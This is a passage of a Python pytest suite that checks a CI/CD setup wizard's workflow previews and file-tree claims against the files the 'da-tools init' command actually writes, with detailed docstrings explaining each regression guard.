    """The preview carried the #1356 `needs:` defect too — this holds the fix.

    Unlike the column-0 indentation bug (which the preview never had, because
    its ``apply:`` is written inline), the ``needs: [validate, generate]`` +
    ``workflow_dispatch`` combination was present in BOTH generators. So this
    leg is not status-quo pinning: it is the second half of an actual fix, and
    it keeps the two hand-written copies from re-diverging on this axis while
    #1351 is open.
    """
    _assert_job_event_reachability(
        yaml.safe_load(_load_portal_preview(tmp_path, deploy)),
        f"portal CI/CD wizard preview (deploy={deploy})",
        _GH_JOB_EVENTS,
        _GH_JOB_NEEDS,
    )


@_needs_node
def test_portal_preview_actually_varies_with_the_deploy_choice(tmp_path) -> None:
    """⛔ Anti-vacuity floor for the `deploy` axis of the three tests above.

    The CLI matrix got a floor (``test_matrix_matches_the_independent_hand_
    written_floor``); this axis did not, and it needs one for the same reason.
    Every preview test is parametrized over ``DEPLOY_CHOICES``, so all three
    report N cases and read like N-way coverage — but nothing checked the three
    cases were DIFFERENT. If the preview generator stops reading
    ``config.deploy`` (a rename, a typo, a refactor of the config shape), all
    three branches fall through to the ``argocd`` else and the suite runs the
    same YAML three times, still green.

    Measured before this existed: renaming ``config.deploy`` to
    ``config.deployMethod`` in generators.js left 64 passed unchanged.

    Pairwise distinctness is the assertion because it needs no knowledge of what
    each branch should contain — it only requires that the choice reached the
    output at all, which is exactly the property the parametrize claims.
    """
    previews = {d: _load_portal_preview(tmp_path, d) for d in DEPLOY_CHOICES}
    assert len(DEPLOY_CHOICES) >= 2, (
        f"DEPLOY_CHOICES is {DEPLOY_CHOICES!r} — with fewer than two options "
        "this floor cannot measure anything and the axis is not coverage."
    )
    collisions = [
        (a, b)
        for i, a in enumerate(DEPLOY_CHOICES)
        for b in DEPLOY_CHOICES[i + 1:]
        if previews[a] == previews[b]
    ]
    assert not collisions, (
        f"the portal preview is byte-identical for deploy choice(s) "
        f"{collisions} — the wizard stopped reading `config.deploy`, so every "
        "preview test above is now running the same case N times while "
        "reporting N-way coverage. Check "
        "tools/portal/src/interactive/tools/cicd-setup-wizard/utils/"
        "generators.js (cicdGenerateGitHubActionsPreview) and rebuild "
        "docs/assets/dist/."
    )


# ============================================================
# ── 5. "Which files do you get?" — the third claim surface ──
# ============================================================
#
# The workflow YAML is not the only thing these two generators promise. Both
# also answer "what will `da-tools init` put in my repo?" — the CLI through its
# --dry-run preview, the wizard through the ASCII tree on its summary step. Two
# hand-written answers to a question a third piece of code (run_init) actually
# decides, which is the shape that produced #1351 in the first place.

# Independent of everything under test: written from the four unconditional
# `_write_file` calls in run_init, not derived from _preview_files or from the
# portal. A floor taken from either side would be satisfied by both sides
# collapsing to empty together.
_ALWAYS_WRITTEN = frozenset({
    "conf.d/_defaults.yaml",
    ".pre-commit-config.da.yaml",
    ".da-init.yaml",
})


def _files_written(root: Path) -> set[str]:
    """The artifact itself — walk the tree, do not ask the tool what it did."""
    return {
        p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()
    }


@pytest.mark.parametrize(
    "config_source,git_repo",
    [("configmap", ""), ("git", "https://git.example.invalid/ops.git")],
    ids=["configmap", "gitops"],
)
@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_dry_run_preview_matches_what_run_init_writes(
    tmp_path, ci, deploy, config_source, git_repo,
) -> None:
    """``--dry-run`` must list exactly the files the real run writes.

    The ``gitops`` axis is not decoration: GitOps Native Mode (run_init step 3b)
    writes ``kustomize/overlays/gitops/{kustomization,git-sync-patch}.yaml``
    for ANY --deploy value, and ``_preview_files`` had no branch for it.
    Measured before the fix: the preview understated every gitops run by two
    files, one of them a Deployment patch — a user who ran --dry-run to see
    whether init would touch ``kustomize/`` was told it would not, and then it
    did. Equality, not containment: an over-promise (a path previewed but never
    created) is the same defect pointed the other way.
    """
    config = {
        "ci": ci,
        "deploy": deploy,
        "rule_packs": ["mariadb"],
        "tenants": ["db-a"],
        "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
        "config_source": config_source,
        "git_repo": git_repo,
    }
    target = tmp_path / "out"
    ip.run_init(config, str(target))

    actual = _files_written(target)
    base = PurePosixPath(target.as_posix())
    preview = {
        str(PurePosixPath(p).relative_to(base))
        for p in ip._preview_files(config, str(target))
    }
    assert _ALWAYS_WRITTEN <= actual, (
        f"run_init wrote {sorted(actual)} for --ci {ci} --deploy {deploy}; the "
        "files every run is supposed to produce are missing, so comparing it "
        "against the preview would compare two empties."
    )
    assert preview == actual, (
        f"`da-tools init --ci {ci} --deploy {deploy}` (config_source="
        f"{config_source}) previews a different file set than it writes.\n"
        f"  previewed but never created: {sorted(preview - actual)}\n"
        f"  created but never previewed: {sorted(actual - preview)}\n"
        "Fix _preview_files to follow run_init — never the reverse."
    )


@_needs_node
@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_portal_file_tree_matches_what_init_writes(
    tmp_path, generated, ci, deploy,
) -> None:
    """The wizard's file tree is a claim about the CLI, so hold it to the CLI.

    ⛔ This is the assertion that was missing when the wizard promised
    ``kustomize/`` and ``argocd/`` for ``--deploy argocd``. ``run_init``
    scaffolds deployment files for ``--deploy kustomize`` ONLY, so the argocd
    user was shown two directories that never arrive — and the portal's own
    Vitest suite pinned the wrong answer in place (``emits argocd/ ONLY when
    deploy=argocd``), which is why five rounds of review over these two
    generators never surfaced it: every existing test agreed with the wizard.
    Measured before this test existed: with the old tree restored, the full
    file ran 297 passed.

    Both sides are read from the artifact — the portal's exported path list and
    a walk of the directory run_init really wrote — so neither can be satisfied
    by a generator that merely *says* the right thing.
    """
    claimed = set(json.loads(_call_portal(
        tmp_path,
        "cicdGeneratedPaths",
        {"ci": ci, "deploy": deploy, "tenants": ["db-a"], "packs": ["mariadb"]},
    )))
    actual = _files_written(generated[(ci, deploy)])

    assert _ALWAYS_WRITTEN <= actual, (
        f"run_init wrote {sorted(actual)} for --ci {ci} --deploy {deploy} — "
        "too little to compare against; check the fixture, not the wizard."
    )
    assert claimed == actual, (
        f"the CI/CD wizard's file tree disagrees with `da-tools init --ci {ci} "
        f"--deploy {deploy}`.\n"
        f"  promised by the wizard, never written: {sorted(claimed - actual)}\n"
        f"  written by the CLI, not shown: {sorted(actual - claimed)}\n"
        "The wizard is the copy; edit cicdGeneratedPaths in generators.js "
        "(then rebuild docs/assets/dist/). Do NOT silence this by widening the "
        "comparison — the whole point is that the two must be equal."
    )


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
